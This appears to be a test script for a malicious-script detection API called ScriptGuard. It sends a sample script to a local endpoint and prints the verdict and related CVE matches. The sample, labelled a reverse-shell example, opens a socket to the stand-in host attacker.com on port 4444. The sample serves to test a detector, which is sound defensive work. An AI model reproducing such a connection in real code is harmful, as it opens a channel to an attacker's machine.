"""
Test API endpoint with RAG enabled.
Start the API first: python src/scriptguard/api/main.py
"""

import requests
import json

API_URL = "http://localhost:8000"
API_KEY = "your_api_key_here"  # Set in .env as SCRIPTGUARD_API_KEY

def test_analyze_endpoint():
    """Test /analyze endpoint with RAG enabled."""

    # Test script (reverse shell example)
    malicious_script = """
import socket
s = socket.socket()
s.connect(('attacker.com', 4444))
s.send(b'connected')
"""

    # Make request with RAG enabled
    headers = {
        "X-API-Key": API_KEY,
        "Content-Type": "application/json"
    }

    payload = {
        "script_content": malicious_script,
        "include_rag": True  # Enable RAG
    }

    print("Testing /analyze endpoint with RAG enabled...")
    print(f"Script: {malicious_script[:60]}...")
    print(f"\nSending request to {API_URL}/analyze...")

    try:
        response = requests.post(
            f"{API_URL}/analyze",
            headers=headers,
            json=payload,
            timeout=30
        )

        print(f"\nStatus: {response.status_code}")

        if response.status_code == 200:
            result = response.json()
            print(f"\nResult:")
            print(f"  Is Malicious: {result['is_malicious']}")
            print(f"  Confidence: {result['confidence']:.4f}")
            print(f"  Reasoning: {result['reasoning'][:100]}...")
            print(f"\n  Related CVEs/Samples: {len(result.get('related_cves', []))}")

            for i, cve in enumerate(result.get('related_cves', [])[:3], 1):
                print(f"    {i}. Score: {cve.get('score', 0):.4f}")
                print(f"       Desc: {cve.get('description', 'N/A')[:60]}...")

            if len(result.get('related_cves', [])) > 0:
                print("\n✅ SUCCESS! RAG is returning results!")
            else:
                print("\n❌ FAILED! No RAG results returned.")

        else:
            print(f"Error: {response.text}")

    except Exception as e:
        print(f"Request failed: {e}")
        print("\nMake sure the API is running:")
        print("  python src/scriptguard/api/main.py")


if __name__ == "__main__":
    test_analyze_endpoint()